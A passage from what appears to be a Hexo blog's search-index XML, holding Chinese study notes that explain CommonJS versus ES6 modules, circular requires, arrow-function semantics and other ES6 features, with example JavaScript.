      <link href="/2022/08/04/%E6%A8%A1%E5%9D%97%E5%8C%96(%E7%AC%AC%E4%B9%9D%E5%A4%A9)/"/>
      <url>/2022/08/04/%E6%A8%A1%E5%9D%97%E5%8C%96(%E7%AC%AC%E4%B9%9D%E5%A4%A9)/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonJS规范"><a href="#CommonJS规范" class="headerlink" title="CommonJS规范"></a>CommonJS规范</h1><p>CommonJS规范加载模块是<font color="#FF8C00">同步</font>的，只有加载完成，才能执行后面的操作。<br>CommonJS规范中的module、exports和require</p><ul><li>每个文件就是一个模块，有自己的作用域。每个模块内部，<font color="#FF00FF">module变量代表当前模块，是一个对象，它的exports属性（即module.exports）是对外的接口。</font></li><li><font color="#FF8C00">module.exports属性表示当前模块对外输出的接口，其他文件加载该模块，实际上就是读取module.exports变量</font>。</li><li>为了方便，Node为每个模块提供一个exports变量，指向module.exports。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let exports = module.exports;</span><br></pre></td></tr></table></figure><blockquote><p> //name.js<br>  exports.name = function(){return ‘李婷婷’}; //导出<br>  //getName.js<br>  let getName = require(‘name’); //引入</p></blockquote><p><font color="#FF00FF">不能直接将exports变量指向一个值，因为这样等于切断了exports与module.exports的联系</font>：如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exports = function(x)&#123;console.log(x)&#125;</span><br></pre></td></tr></table></figure><p><font color="#FF00FF">如果一个模块的对外接口，就是一个单一的值，不能使用exports输出，只能使用module.exports输出</font>。</p><p>CommonJS模块导入用require，导出用module.exports。导出的对象需注意，<font color="#FF00FF">如果是静态值，而且非常量，后期可能会有所改动的，请使用函数动态获取，否则无法获取修改值</font>。导入的参数，是可以随意改动的，所以使用时要注意</p><h1 id="ES6-module-和-CommonJS-module-的区别"><a href="#ES6-module-和-CommonJS-module-的区别" class="headerlink" title="ES6 module 和 CommonJS module 的区别"></a>ES6 module 和 CommonJS module 的区别</h1><ul><li>为CommonJS的require语法是同步的，所以就导致了<strong>CommonJS</strong>模块规范<font color="#FF00FF">只适合用在服务端</font>，而<strong>ES6模块无论是在浏览器端还是服务端都是可以使用的，但是在服务端中，还需要遵循一些特殊的规则才能使用</strong> ；</li><li>CommonJS 模块输出的是一个<font color="#FF00FF">值的拷贝</font>，而ES6 模块输出的是<font color="#FF00FF">值的引用</font>；</li><li>CommonJS 模块是运行时加载，而ES6 模块是编译时输出接口，使得对JS的模块进行静态分析成为了可能</li><li>因为两个模块加载机制的不同，所以在对待循环加载的时候，它们会有不同的表现。<font color="#FF00FF">CommonJS遇到循环依赖的时候，只会输出已经执行的部分，后续的输出或者变化，是不会影响已经输出的变量。而ES6模块相反，使用import加载一个变量，变量不会被缓存，真正取值的时候就能取到最终的值；</font></li><li>关于模块顶层的this指向问题，<font color="#FF00FF">在CommonJS顶层，this指向当前模块；而在ES6模块中，this指向undefined；</font></li><li>关于两个模块互相引用的问题，<font color="#FF00FF">在ES6模块当中，是支持加载CommonJS模块的。但是反过来，CommonJS并不能requireES6模块，在NodeJS中，两种模块方案是分开处理的</font>。<h1 id="ES6-module、CommonJS-module-循环引用的问题"><a href="#ES6-module、CommonJS-module-循环引用的问题" class="headerlink" title="ES6 module、CommonJS module 循环引用的问题"></a>ES6 module、CommonJS module 循环引用的问题</h1></li><li><em>循环加载指的是a脚本的执行依赖b脚本，b脚本的执行依赖a脚本</em>*</li></ul><ol><li><font color="#FF00FF">CommonJS模块是加载时执行。一旦出现某个模块被“循环加载”，就只输出已经执行的部分，没有执行的部分不会输出</font>。</li><li><font color="#FF00FF">ES6模块对导出模块，变量，对象是动态引用，遇到模块加载命令import时不会去执行模块，只是生成一个指向被加载模块的引用。</font></li></ol><p>CommonJS模块规范主要适用于后端Node.js，后端Node.js是<font color="#FF00FF">同步</font>模块加载，所以在模块循环引入时模块已经执行完毕。推荐前端工程中使用ES6的模块规范，<font color="#FF8C00">通过安装Babel转码插件支持ES6模块引入</font>的语法。</p><h2 id="CommonJS模块的加载原理"><a href="#CommonJS模块的加载原理" class="headerlink" title="CommonJS模块的加载原理"></a>CommonJS模块的加载原理</h2><p>CommonJS模块就是一个脚本文件，require命令第一次加载该脚本时就会执行整个脚本，然后在内存中生成该模块的一个说明对象。</p><blockquote><p>{<br>    id: ‘’,  //模块名，唯一<br>    exports: {  //模块输出的各个接口<br>        …<br>    },<br>    loaded: true,  //模块的脚本是否执行完毕<br>    …<br>}</p></blockquote><p>以后用到这个模块时，就会到对象的exports属性中取值。<font color="#FF8C00">即使再次执行require命令，也不会再次执行该模块，而是到缓存中取值。</font></p><p><font color="#FF00FF">CommonJS模块是加载时执行，即脚本代码在require时就全部执行。一旦出现某个模块被“循环加载”，就只输出已经执行的部分，没有执行的部分不会输出</font>。</p><p><strong>案例说明：</strong></p><blockquote><p>//a.js<br>exports.done = false;<br>var b = require(‘./b.js’);<br>console.log(‘在a.js中，b.done = %j’, b.done);<br>exports.done = true;<br>console.log(‘a.js执行完毕！’)<br>//b.js<br>exports.done = false;<br>var a = require(‘./a.js’);<br>console.log(‘在b.js中，a.done = %j’, a.done);<br>exports.done = true;<br>console.log(‘b.js执行完毕！’)<br>//main.js<br>var a = require(‘./a.js’);<br>var b = require(‘./b.js’);<br>console.log(‘在main.js中，a.done = %j, b.done = %j’, a.done, b.done);</p></blockquote><p><strong>输出结果如下：</strong></p><blockquote><p>//node环境下运行main.js<br>node main.js<br>在b.js中，a.done = false<br>b.js执行完毕！<br>在a.js中，b.done = true<br>a.js执行完毕！<br>在main.js中，a.done = true, b.done = true</p></blockquote><p><strong>JS代码执行顺序如下：</strong><br>1）main.js中先加载a.js，a脚本先输出done变量，值为false，然后加载b脚本，a的代码停止执行，等待b脚本执行完成后，才会继续往下执行。<br>2）b.js执行到第二行会去加载a.js，这时发生循环加载，系统会去a.js模块对应对象的exports属性取值，因为a.js没执行完，从exports属性只能取回已经执行的部分，未执行的部分不返回，所以取回的值并不是最后的值。<br>3）a.js已执行的代码只有一行，exports.done = false;所以对于b.js来说，require a.js只输出了一个变量done，值为false。往下执行console.log(‘在b.js中，a.done = %j’, a.done);控制台打印出：</p><blockquote><p>在b.js中，a.done = false</p></blockquote><p>4）b.js继续往下执行，done变量设置为true，console.log(‘b.js执行完毕！’)，等到全部执行完毕，将执行权交还给a.js。此时控制台输出：</p><blockquote><p>b.js执行完毕！</p></blockquote><p>5）执行权交给a.js后，a.js接着往下执行，执行console.log(‘在a.js中，b.done = %j’, b.done);控制台打印出：</p><blockquote><p>在a.js中，b.done = true</p></blockquote><p>6）a.js继续执行，变量done设置为true，直到a.js执行完毕。</p><blockquote><p>a.js执行完毕！</p></blockquote><p>7）main.js中第二行不会再次执行b.js，直接输出缓存结果。最后控制台输出：</p><blockquote><p>在main.js中，a.done = true, b.done = true</p></blockquote><p><strong>总结：</strong></p>]]></content>
      
      
      <categories>
          
          <category> plan </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> graduate student </tag>
            
            <tag> study </tag>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ES5 vs ES6</title>
      <link href="/2022/08/03/ES5%20vs%20ES6(%E7%AC%AC%E5%85%AD%E5%A4%A9)/"/>
      <url>/2022/08/03/ES5%20vs%20ES6(%E7%AC%AC%E5%85%AD%E5%A4%A9)/</url>
      
        <content type="html"><![CDATA[<h1 id="es6中箭头函数"><a href="#es6中箭头函数" class="headerlink" title="es6中箭头函数"></a>es6中箭头函数</h1><h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><p>ES6中允许使用箭头=&gt;来定义箭头函数，具体语法，我们来看一个简单的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// 箭头函数</span><br><span class="line">let fun = (name) =&gt; &#123;</span><br><span class="line">    // 函数体</span><br><span class="line">    return `Hello $&#123;name&#125; !`;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 等同于</span><br><span class="line">let fun = function (name) &#123;</span><br><span class="line">    // 函数体</span><br><span class="line">    return `Hello $&#123;name&#125; !`;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看出，定义箭头函在数语法上要比普通函数简洁得多。箭头函数省去了function关键字，采用箭头=&gt;来定义函数。函数的参数放在=&gt;前面的括号中，函数体跟在=&gt;后的花括号中。</p><p><strong>关于箭头函数的参数：</strong><br>① 如果箭头函数没有参数，直接写一个空括号即可。<br>② 如果箭头函数的参数只有一个，也可以省去包裹参数的括号。<br>③ 如果箭头函数有多个参数，将参数依次用逗号(,)分隔，包裹在括号中即可。、</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// 没有参数</span><br><span class="line">let fun1 = () =&gt; &#123;</span><br><span class="line">    console.log(111);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 只有一个参数，可以省去参数括号</span><br><span class="line">let fun2 = name =&gt; &#123;</span><br><span class="line">    console.log(`Hello $&#123;name&#125; !`)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 有多个参数</span><br><span class="line">let fun3 = (val1, val2, val3) =&gt; &#123;</span><br><span class="line">    return [val1, val2, val3];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>关于箭头函数的函数体：</strong><br>① 如果箭头函数的函数体只有一句代码，就是简单返回某个变量或者返回一个简单的JS表达式，可以省去函数体的大括号{ }。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">let f = val =&gt; val;</span><br><span class="line">// 等同于</span><br><span class="line">let f = function (val) &#123; return val &#125;;</span><br><span class="line"></span><br><span class="line">let sum = (num1, num2) =&gt; num1 + num2;</span><br><span class="line">// 等同于</span><br><span class="line">let sum = function(num1, num2) &#123;</span><br><span class="line">  return num1 + num2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>② 如果箭头函数的函数体只有一句代码，就是返回一个对象，可以像下面这样写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 用小括号包裹要返回的对象，不报错</span><br><span class="line">let getTempItem = id =&gt; (&#123; id: id, name: &quot;Temp&quot; &#125;);</span><br><span class="line"></span><br><span class="line">// 但绝不能这样写，会报错。</span><br><span class="line">// 因为对象的大括号会被解释为函数体的大括号</span><br><span class="line">let getTempItem = id =&gt; &#123; id: id, name: &quot;Temp&quot; &#125;;</span><br></pre></td></tr></table></figure><p>③ 如果箭头函数的函数体只有一条语句并且不需要返回值（最常见是调用一个函数），<font color="#FF00FF">可以给这条语句前面加一个void关键字</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let fn = () =&gt; void doesNotReturn();</span><br></pre></td></tr></table></figure><p>箭头函数最常见的用处就是简化回调函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// 例子一</span><br><span class="line">// 正常函数写法</span><br><span class="line">[1,2,3].map(function (x) &#123;</span><br><span class="line">  return x * x;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// 箭头函数写法</span><br><span class="line">[1,2,3].map(x =&gt; x * x);</span><br><span class="line"></span><br><span class="line">// 例子二</span><br><span class="line">// 正常函数写法</span><br><span class="line">var result = [2, 5, 1, 4, 3].sort(function (a, b) &#123;</span><br><span class="line">  return a - b;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// 箭头函数写法</span><br><span class="line">var result = [2, 5, 1, 4, 3].sort((a, b) =&gt; a - b);</span><br></pre></td></tr></table></figure><h2 id="箭头函数与普通函数的区别"><a href="#箭头函数与普通函数的区别" class="headerlink" title="箭头函数与普通函数的区别"></a>箭头函数与普通函数的区别</h2><ol><li>语法更加简洁、清晰<br>从上面的基本语法示例中可以看出，箭头函数的定义要比普通函数定义简洁、清晰得多，很快捷。</li><li>箭头函数不会创建自己的this<br><font color="#FF8C00">箭头函数没有自己的this</font>，它会捕获自己在定义时（注意，是<font color="#FF00FF">定义时，</font>不是调用时）所处的外层执行环境的this，并继承这个this值。所以，箭头函数中this的指向在它被定义的时候就已经确定了，之后<font color="#FF8C00">永远不会改变</font>。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">var id = &#x27;Global&#x27;;</span><br><span class="line"></span><br><span class="line">function fun1() &#123;</span><br><span class="line">    // setTimeout中使用匿名函数</span><br><span class="line">    setTimeout(function()&#123;</span><br><span class="line">        console.log(this.id);</span><br><span class="line">    &#125;, 2000);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function fun2() &#123;</span><br><span class="line">    // setTimeout中使用箭头函数</span><br><span class="line">    setTimeout(() =&gt; &#123;</span><br><span class="line">        console.log(this.id);</span><br><span class="line">    &#125;, 2000)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fun1.call(&#123;id: &#x27;Obj&#x27;&#125;);     // &#x27;Global&#x27;</span><br><span class="line"></span><br><span class="line">fun2.call(&#123;id: &#x27;Obj&#x27;&#125;);     // &#x27;Obj&#x27;</span><br></pre></td></tr></table></figure><p>上面这个例子，函数fun1中的setTimeout中使用匿名函数，2秒后函数执行时，这时函数其实是<font color="#FF8C00">在全局作用域</font>执行的，所以this指向Window对象，this.id就指向全局变量id，所以输出’Global’。 但是函数fun2中的setTimeout中使用的是箭头函数，这个箭头函数的this在定义时就确定了，它继承了它外层fun2的执行环境中的this，而fun2调用时this被call方法改变到了对象{id: ‘Obj’}中，所以输出’Obj’</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">var id = &#x27;GLOBAL&#x27;;</span><br><span class="line">var obj = &#123;</span><br><span class="line">  id: &#x27;OBJ&#x27;,</span><br><span class="line">  a: function()&#123;</span><br><span class="line">    console.log(this.id);</span><br><span class="line">  &#125;,</span><br><span class="line">  b: () =&gt; &#123;</span><br><span class="line">    console.log(this.id);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.a();    // &#x27;OBJ&#x27;</span><br><span class="line">obj.b();    // &#x27;GLOBAL&#x27;</span><br></pre></td></tr></table></figure><p>上面这个例子，对象obj的方法a使用普通函数定义的，普通函数作为<font color="#FF00FF">对象的方法</font>调用时，this指向它所属的对象。所以，this.id就是obj.id，所以输出’OBJ’。 但是方法b是使用箭头函数定义的，箭头函数中的this实际是继承的它定义时所处的全局执行环境中的this，所以指向Window对象，所以输出’GLOBAL’。（这里要注意，<font color="#bf242a">定义对象的大括号{}是无法形成一个单独的执行环境的，它依旧是处于全局执行环境中！！</font>）</p><h2 id="箭头函数继承而来的this指向永远不变"><a href="#箭头函数继承而来的this指向永远不变" class="headerlink" title="箭头函数继承而来的this指向永远不变"></a>箭头函数继承而来的this指向永远不变</h2><p>上面的例子，就完全可以说明箭头函数继承而来的this指向永远不变。<font color="#FF00FF">对象obj的方法b是使用箭头函数定义的，这个函数中的this就永远指向它定义时所处的全局执行环境中的this</font>，即便这个函数是作为对象obj的方法调用，this依旧指向Window对象。</p><h2 id="call-apply-bind-无法改变箭头函数中this的指向"><a href="#call-apply-bind-无法改变箭头函数中this的指向" class="headerlink" title="call()/.apply()/.bind()无法改变箭头函数中this的指向"></a>call()/.apply()/.bind()无法改变箭头函数中this的指向</h2><p>.call()/.apply()/.bind()方法可以用来动态修改函数执行时this的指向，但由于箭头函数的this定义时就已经确定且永远不会改变。所以使用这些方法永远也改变不了箭头函数this的指向，<font color="#FF00FF">虽然这么做代码不会报错。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var id = &#x27;Global&#x27;;</span><br><span class="line">// 箭头函数定义在全局作用域</span><br><span class="line">let fun1 = () =&gt; &#123;</span><br><span class="line">    console.log(this.id)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">fun1();     // &#x27;Global&#x27;</span><br><span class="line">// this的指向不会改变，永远指向Window对象</span><br><span class="line">fun1.call(&#123;id: &#x27;Obj&#x27;&#125;);     // &#x27;Global&#x27;</span><br><span class="line">fun1.apply(&#123;id: &#x27;Obj&#x27;&#125;);    // &#x27;Global&#x27;</span><br><span class="line">fun1.bind(&#123;id: &#x27;Obj&#x27;&#125;)();   // &#x27;Global&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="箭头函数不能作为构造函数使用"><a href="#箭头函数不能作为构造函数使用" class="headerlink" title="箭头函数不能作为构造函数使用"></a>箭头函数不能作为构造函数使用</h2><p><a href="https://juejin.cn/post/6871454580161380365">当我们new一个构造函数时，发生了什么？ - 掘金</a><br>我们先了解一下<font color="#FF8C00">构造函数的new</font>都做了些什么？简单来说，分为四步： ① JS内部首先会先生成一个空对象； ② 再把函数中的this指向该对象； ③ 然后执行构造函数中的语句； ④ 最终返回该对象实例</p><p><font color="#9400D3">但是因为箭头函数没有自己的this，它的this其实是继承了外层执行环境中的this，且this指向永远不会随在哪里调用、被谁调用而改变，所以箭头函数不能作为构造函数使用，或者说构造函数不能定义成箭头函数，否则用new调用时会报错</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">let Fun = (name, age) =&gt; &#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.age = age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 报错</span><br><span class="line">let p = new Fun(&#x27;cao&#x27;, 24);</span><br></pre></td></tr></table></figure><h2 id="箭头函数没有自己的arguments"><a href="#箭头函数没有自己的arguments" class="headerlink" title="箭头函数没有自己的arguments"></a>箭头函数没有自己的arguments</h2><p>箭头函数没有自己的arguments对象。<font color="#FF00FF">在箭头函数中访问arguments实际上获得的是外层局部（函数）执行环境中的值。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// 例子一</span><br><span class="line">let fun = (val) =&gt; &#123;</span><br><span class="line">    console.log(val);   // 111</span><br><span class="line">    // 下面一行会报错</span><br><span class="line">    // Uncaught ReferenceError: arguments is not defined</span><br><span class="line">    // 因为外层全局环境没有arguments对象</span><br><span class="line">    console.log(arguments); </span><br><span class="line">&#125;;</span><br><span class="line">fun(111);</span><br><span class="line"></span><br><span class="line">// 例子二</span><br><span class="line">function outer(val1, val2) &#123;</span><br><span class="line">    let argOut = arguments;</span><br><span class="line">    console.log(argOut);    // ①</span><br><span class="line">    let fun = () =&gt; &#123;</span><br><span class="line">        let argIn = arguments;</span><br><span class="line">        console.log(argIn);     // ②</span><br><span class="line">        console.log(argOut === argIn);  // ③</span><br><span class="line">    &#125;;</span><br><span class="line">    fun();</span><br><span class="line">&#125;</span><br><span class="line">outer(111, 222);</span><br></pre></td></tr></table></figure><p>上面例子二，①②③处的输出结果如下：</p><p><img src="http://files.shanqianche.cn/20228/1659514213304.png" alt="res"><br>很明显，普通函数outer内部的箭头函数fun中的arguments对象，其实是沿作用域链向上访问的外层outer函数的arguments对象。<br><strong>可以在箭头函数中使用rest参数代替arguments对象，来访问箭头函数的参数列表！！</strong></p><h2 id="箭头函数没有原型prototype"><a href="#箭头函数没有原型prototype" class="headerlink" title="箭头函数没有原型prototype"></a>箭头函数没有原型prototype</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let sayHi = () =&gt; &#123;</span><br><span class="line">    console.log(&#x27;Hello World !&#x27;)</span><br><span class="line">&#125;;</span><br><span class="line">console.log(sayHi.prototype); // undefined</span><br></pre></td></tr></table></figure><h2 id="箭头函数不能用作Generator函数，不能使用yeild关键字"><a href="#箭头函数不能用作Generator函数，不能使用yeild关键字" class="headerlink" title="箭头函数不能用作Generator函数，不能使用yeild关键字"></a>箭头函数不能用作Generator函数，不能使用yeild关键字</h2><h1 id="ES6新特性"><a href="#ES6新特性" class="headerlink" title="ES6新特性"></a>ES6新特性</h1><h2 id="变量和作用域"><a href="#变量和作用域" class="headerlink" title="变量和作用域"></a>变量和作用域</h2><h3 id="let-、const、-块级作用域和变量声明"><a href="#let-、const、-块级作用域和变量声明" class="headerlink" title="let 、const、 块级作用域和变量声明"></a>let 、const、 块级作用域和变量声明</h3><p>let声明的变量只在所在块中生效；<br>let声明的变量可以解决var与for循环结合使用产生的无法取得最新变量值的问题（<font color="#FF8C00">以往都需要通过闭包来解决这个问题</font>）；<br><font color="#FF00FF">let声明的变量不存在变量提升</font>（<font color="#FF00FF">从undefined-&gt;ReferenceError，其实也是一种暂时性死区</font>）、<font color="#bf242a">会造成变量暂时性死区(在声明let变量之前都不能用它)、也不允许重复声明</font>；</p><p>const声明的变量行为与let类似，只是多了两点更强的约束：<font color="#FF00FF">1.声明时必须赋值；2.声明的变量内存地址不可变</font>，需要注意的是：对于用const声明基本类型，值就保存在内存地址之中，意味着变量不可重新赋值；<font color="#FF00FF">对于用const声明的对象，对象内容还是可以更改的，只是不能改变其指向。（冻结对象应该用Object.freeze()）</font></p><h3 id="解构赋值（按照一定的结构解析出来进行赋值）"><a href="#解构赋值（按照一定的结构解析出来进行赋值）" class="headerlink" title="解构赋值（按照一定的结构解析出来进行赋值）"></a>解构赋值（按照一定的结构解析出来进行赋值）</h3><p>解构赋值的使用场景：<font color="#FF8C00">变量快捷赋值、提取数据、函数参数定义和默认值、遍历某结构</font></p><h2 id="原生对象的方法扩展"><a href="#原生对象的方法扩展" class="headerlink" title="原生对象的方法扩展"></a>原生对象的方法扩展</h2><ol><li><p>String<br>加强了对unicode的支持、支持字符串遍历（后面有讲到实际上是部署了iterator接口）、repeat()等方法的支持、模板字符串</p></li><li><p>RegExp<br>构造函数第一个参数是正则表达式，指定第二个参数不再报错、u修饰符、y修饰符、s修饰符</p></li><li><p>Number<br>二进制和八进制新写法、新方法parseInt()、<font color="#FF00FF">Number.EPSILON极小常量、安全整数、Math新方法</font></p></li><li><p>Function<br>函数参数默认值、rest参数、函数内部严格模式、函数的name属性、箭头函数</p></li><li><p>Array<br>扩展运算符…</p></li><li><p>Object 和 Symbol</p></li></ol><ul><li>Object对象<br>支持简写：同名属性K-V可以省略一个、<font color="#FF00FF">函数声明可以省略function</font>；支持属性名表达式、函数名表达 式。（注意：以上2个——<font color="#FF00FF">表达式和简写不能同时使用</font>）。</li></ul><p>对象的方法的name属性返回方法名，但有几个例外情况要小心。新增了Object方法<br>Object.is()——用于解决<code>==</code> 和<code>==</code>的部分兼容问题<br>Object.assign()——将src的所有可枚举对象属性复制到dest对象上（<font color="#FF8C00">浅复制</font>）<br>Object.setPrototypeOf()、Object.getPrototypeOf() (Object.__proto属性)<br>Object.entries()、Object.keys()、Object.values()</p><p>ES6中5种遍历对象属性的方法<br>for-in——<font color="#FF00FF">自身和继承</font>的可枚举属性（除Symbol）<br>Object.keys()——自身<font color="#FF00FF">非继承</font>的可枚举属性（除Symbol）<br>Object.getOwnPropertyNames()——<font color="#FF00FF">自身所有属性键名</font>（包括不可枚举、除Symbol）<br>Object.getOwnPropertySymbols()——自身的所有 Symbol 属性的键名<br>Reflect.ownKeys()——自身的所有键名</p><ul><li>Symbol类型<br>ES5以前，对象属性都只能是字符串，容易造成重命名导致的冲突。Symbol提供了一种机制，可以保存 属性名是独一无二的。Symbol类型的使用注意：1）<font color="#FF00FF">创建是调用函数，</font>而不是new关键字 2）Symbol类 型的属性不会被for-*、Object.keys()、Object.getPropertyNames()返回，可以用<font color="#FF00FF">后面两种</font>方法遍历。<h2 id="数据结构Set和Map"><a href="#数据结构Set和Map" class="headerlink" title="数据结构Set和Map"></a>数据结构Set和Map</h2>Set是一种类似数组的数据结构，区别在于其存储的成员都是不重复的，由此带来了它的一个应用就是：<font color="#FF8C00">去重</font>。Set通过new关键字实例化，入参可以是数组or<font color="#FF00FF">类数组的对象</font>。</li></ul><p>值得注意的是：在Set中，只能存储一个NaN，<font color="#FF00FF">这说明在Set数据结构中，NaN等于NaN</font>。</p><p>Set实例的方法：<font color="#FF8C00">操作方法add()、delete()、has()和clear()；遍历方法：keys()、values()、entries()和forEach();扩展运算符…、数组方法map()、filter()方法也可以用于Set结构</font>。由此它可以很方便的实现数组的交、并、差集。</p><p>WeakSet类似于Set，<strong>主要区别在于1.成员只能是对象类型；2.对象都是弱引用（如果其他对象都不再引用该对象，垃圾回收机制会自动回收该对象所占的内存，<font color="#FF00FF">不可预测何时会发生，故WeakSet不可被遍历</font>）</strong></p><p>JavaScript对象Object都是键值K-V对的集合，但<strong>K取值只能是字符串和Symbol</strong>，Map也是K-V的集合，然而其K可以取任意类型。如果需要键值对的集合，Map比Object更适合。Map通过new关键字实例化。</p><p>Map实例的方法：set()、get()、has()、delete()和clear();遍历方法同Set。</p><p>Map与其它数据结构的互相转换：Map &lt;—&gt; 数组| Map &lt;—&gt; 对象| Map &lt;—&gt; JSON。</p><p>WeakMap类似于Map，主要区别在于：<font color="#FF00FF">1.只接受对象作为键名；2.键名所指向的对象不计入垃圾回收机制</font>。</p><h2 id="元编程相关Proxy和Reflect"><a href="#元编程相关Proxy和Reflect" class="headerlink" title="元编程相关Proxy和Reflect"></a>元编程相关Proxy和Reflect</h2><h3 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h3><p>对目标对象加一层“拦截”（“代理”），外界对对象的访问、修改都必须先通过这层拦截层。因而它提供了 一个机制可以对外界的访问进行过滤和改写。</p><p>用法：var proxy = new Proxy(p1,p2); <strong>p1是要被代理的目标对象，p2是配置对象</strong>。</p><p>值得注意的是：TODO <font color="#FF00FF">Proxy不是对目标对象透明的代理——即使不做任何拦截的情况下无法保证代理对象与目 标对象行为的完全一致。（主要原因在于代理时，目标对象内部的this会指向代理对象）</font></p><h3 id="Reflect"><a href="#Reflect" class="headerlink" title="Reflect"></a>Reflect</h3><p>TODO<br>与Proxy一样是ES6为语言层面的用于操作对象提供的新API，目前它所拥有的对象方法与Proxy对象一一对应，引入目的：1.将Object对象上一些属于语言内部的方法放在Reflect上（目前都可以放）2.修改Object对象上某些方法的返回值，使得更加合理化（健壮）3.让Object对象的操作从命令式完全转化为函数式</p><h2 id="异步编程Promise、Generator和Async"><a href="#异步编程Promise、Generator和Async" class="headerlink" title="异步编程Promise、Generator和Async"></a>异步编程Promise、Generator和Async</h2><p>在JavaScript的世界里，对于异步编程存在如下几种方案：<font color="#FF8C00">1.回调函数；2.事件触发监听；3.发布订阅者模式；4.Promise。</font><br><font 